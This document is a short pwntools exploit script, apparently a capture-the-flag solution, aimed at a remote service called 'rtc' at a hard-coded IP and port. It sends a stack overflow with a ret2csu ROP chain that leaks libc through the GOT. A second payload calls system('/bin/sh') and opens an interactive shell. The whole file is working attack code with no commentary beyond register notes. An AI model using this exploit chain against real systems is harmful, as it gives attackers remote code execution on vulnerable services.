from pwn import *

# p = process("./rtc")
p = remote("141.164.39.45", 9030)
e = ELF("./rtc")
libc = ELF("./libc.so.6")
context.log_level = 'debug'

stage1 = 0x00000000004006BA
stage2 = 0x00000000004006A0
pop_rdi = 0x00000000004006c3
bss = e.bss()

pl = b''
pl += b'A' * 0x40 + b'B' * 0x8

pl += p64(stage1)

# read(0, bss, 8) <- /bin/sh
pl += p64(0) # rbp
pl += p64(1) # rbp
pl += p64(e.got['read']) # r12 = addr
pl += p64(8) # r13 = rdx
pl += p64(e.bss() + 0x100) # r14 = rsi
pl += p64(0) # r15 = rdi
pl += p64(stage2)

# write(1, read_got, 8)
pl += p64(0)
pl += p64(0)
pl += p64(1)
pl += p64(e.got['write'])
pl += p64(10)
pl += p64(e.got['read'])
pl += p64(1)
pl += p64(stage2)

pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(e.sym['main'])

p.sendlineafter(b"Hey, ROP! What's Up?\n", pl)

p.send(b'/bin/sh\x00')

read_add = u64(p.recvuntil(f'\x7f').ljust(8, b'\x00'))
libc_base = read_add - libc.sym['read']
system = libc_base + libc.sym['system']
log.success(f'read_add : {hex(read_add)}')
log.success(f'libc_base : {hex(libc_base)}')
log.success(f'system : {hex(system)}')

pl = b''
pl += b'A' * 0x40 + b'B' * 0x8
pl += p64(pop_rdi)
pl += p64(e.bss() + 0x100)
pl += p64(system)

p.sendlineafter(b"Hey, ROP! What's Up?\n", pl)

p.interactive()